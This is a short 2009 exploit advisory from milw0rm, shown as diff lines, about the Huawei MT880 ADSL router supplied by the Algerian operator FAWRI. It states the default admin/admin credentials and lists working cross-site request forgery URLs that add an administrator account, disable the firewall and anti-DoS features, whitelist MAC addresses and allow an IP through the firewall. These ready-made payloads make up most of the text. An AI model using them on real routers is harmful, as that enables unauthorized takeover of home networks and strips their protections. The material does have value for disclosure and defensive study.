@@ -1,0 +1,37 @@
+Description:
+Huawei MT880 is a device offered by the algerian telecom operator -
+FAWRI, to provide ADSL Internet connexion and it's already widely in use.
+Overview:
+Huawei MT880 firmware and its default configuration has flaws, which
+allows LAN users to gain unauthorized full access to device.
+
+Here are just limited PoCs.
+
+Default credentials on the web-based management interface:
+
+admin/admin
+
+Possible XSRFs:
+
+Adding an administrator user:
+http://admin:admin@192.168.1.1/Action?user_id=jerome&priv=1&pass1=jerome&pass2=jerome&id=70
+
+
+Disabling firewall/anti-DoS... features:
+http://admin:admin@192.168.1.1/Action?blacklisting_status=1&bl_list=10&attack_status=0&dos_status=0&id=42&max_tcp=25&max_icmp=25&max_host=70
+
+
+Adding a MAC address to the whitelist:
+http://admin:admin@192.168.1.1/Action?insrcmac66=123456789123&inblocksrcmac66=1&insrcmac67=000000000000&inblocksrcmac67=1&insrcmac68=000000000000&inblocksrcmac68=1&insrcmac69=000000000000&inblocksrcmac69=1&insrcmac70=000000000000&inblocksrcmac70=1&insrcmac71=000000000000&inblocksrcmac71=1&insrcmac72=000000000000&inblocksrcmac72=1&insrcmac73=000000000000&inblocksrcmac73=1&insrcmac74=000000000000&inblocksrcmac74=1&insrcmac75=000000000000&inblocksrcmac75=1&insrcmac76=000000000000&inblocksrcmac76=1&insrcmac77=000000000000&inblocksrcmac77=1&insrcmac78=000000000000&inblocksrcmac78=1&insrcmac79=000000000000&inblocksrcmac79=1&insrcmac80=000000000000&inblocksrcmac80=1&insrcmac81=000000000000&inblocksrcmac81=1&id=104
+
+
+Adding an IP address allowed by the firewall:
+http://admin:admin@192.168.1.1/Action?ip_1=192&ip_2=168&ip_3=1&ip_4=2&mask_1=255&mask_2=255&mask_3=255&mask_4=255&gateway_1=192&gateway_2=168&gateway_3=1&gateway_4=1&id=7
+
+
+Over flaws are not covered in this advisory.
+
+Cheers
+/JA
+
+# milw0rm.com [2009-08-24]
